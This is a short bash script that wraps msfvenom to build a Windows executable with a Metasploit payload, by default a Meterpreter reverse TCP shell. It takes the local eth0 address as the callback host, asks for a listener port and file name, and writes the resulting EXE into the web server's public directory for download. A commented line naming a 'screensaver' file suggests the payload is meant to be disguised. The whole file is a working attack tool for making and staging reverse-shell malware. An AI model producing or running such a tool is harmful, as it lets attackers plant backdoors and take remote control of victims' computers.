#!/bin/bash
clear
echo "************************************************"
echo " Windows EXE  BINARY GENERATOR FOR METASPLOIT    *"
echo "************************************************"
IP=$(/sbin/ip -o -4 addr list eth0 | awk '{print $4}' | cut -d/ -f1)
echo "Using IP address... $IP"
echo -en "What is the port number on your listener? Please type it and press [Enter]: "
read port
echo -en "What payload do you want to use? e.g. windows/meterpreter/reverse_tcp: "
read pload
echo -en "What is the name of the file?: "
read name
msfvenom -p $pload LHOST=$IP LPORT=$port -f exe > /var/www/html/$name".exe"
echo $name" binary generated.."
#chmod u=rwx /var/www/html/screensaver
ls -la /var/www/html/$name".exe"

